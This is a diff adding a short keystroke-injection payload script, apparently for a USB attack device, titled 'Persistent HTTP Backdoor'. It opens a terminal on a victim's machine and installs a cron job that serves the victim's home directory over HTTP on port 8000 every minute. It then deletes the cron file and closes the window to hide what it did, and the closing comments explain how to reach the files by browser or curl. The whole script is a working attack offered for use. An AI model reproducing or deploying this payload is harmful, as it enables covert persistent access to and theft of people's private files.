@@ -1,0 +1,18 @@
+REM Title: Persistent HTTP Backdoor (Python2)
+REM Author: UndedInside
+REM Description: Hosts the victim's filetree on an HTTP server using the builtin Python2 module
+
+REM Open new terminal window
+DEFAULT_DELAY 400
+ALT t
+
+REM Create backdoor
+STRINGLN echo "* * * * * cd ~ && python2 -m SimpleHTTPServer 8000" > cron
+STRINGLN crontab -i cron
+
+REM Clean up
+STRINGLN rm cron
+ALT F4
+
+REM You can now interact with this by navigating to http://[Victim IP]:8000 in a browser
+REM or curl [Victim IP]:8000
